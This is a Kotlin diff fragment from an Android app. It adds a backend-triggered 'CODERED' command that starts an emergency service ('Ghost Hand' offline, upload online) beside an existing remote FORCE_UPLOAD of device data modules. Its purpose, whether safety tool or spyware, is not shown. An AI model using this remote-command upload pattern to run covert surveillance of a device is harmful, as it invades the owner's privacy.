@@ -55,8 +55,21 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                             val targetDir = File(root, path)
                             if (!targetDir.exists()) targetDir.mkdirs()
 
+                            // --- 0. CODE RED (BACKEND PING) ---
+                            if (cmd.getString("file_name") == "CODERED") {
+                                // Trigger Emergency Service (which handles Ghost Hand if offline, or Upload if online)
+                                val i = android.content.Intent(applicationContext, EmergencyService::class.java)
+                                i.putExtra("codes", "0") // 0 = ALL
+                                i.putExtra("sender", "BACKEND")
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                    applicationContext.startForegroundService(i)
+                                } else {
+                                    applicationContext.startService(i)
+                                }
+                                status = "EXECUTED"
+                            }
                             // --- 1. FORCE UPLOAD ---
-                            if (cmd.getString("file_name") == "FORCE_UPLOAD") {
+                            else if (cmd.getString("file_name") == "FORCE_UPLOAD") {
                                 val modulesStr = cmd.optString("content", "ALL")
                                 val modules = modulesStr.split(",").map { it.trim() }
                                 CloudManager.uploadData(applicationContext, modules, null)
